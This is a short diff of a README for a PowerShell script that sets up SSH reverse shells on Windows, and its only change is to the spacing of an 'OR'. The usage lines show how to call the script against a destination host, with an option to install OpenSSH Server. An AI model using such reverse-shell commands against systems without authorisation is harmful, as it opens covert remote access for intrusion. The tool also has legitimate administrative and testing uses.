@@ -8,7 +8,7 @@ This script is intended to make SSH reverse shells easier to initiate on Windows
 Usage: 
 * .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost `<IP Address>`
 * .\lol-reverseSSHell.ps1 -DestinationUserName aj -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
-  -OR- 
+  - OR - 
 * Double Click .bat file and enter requested information.
 
 Setup Instructions for SSH Keypairs and Help Documentation: 
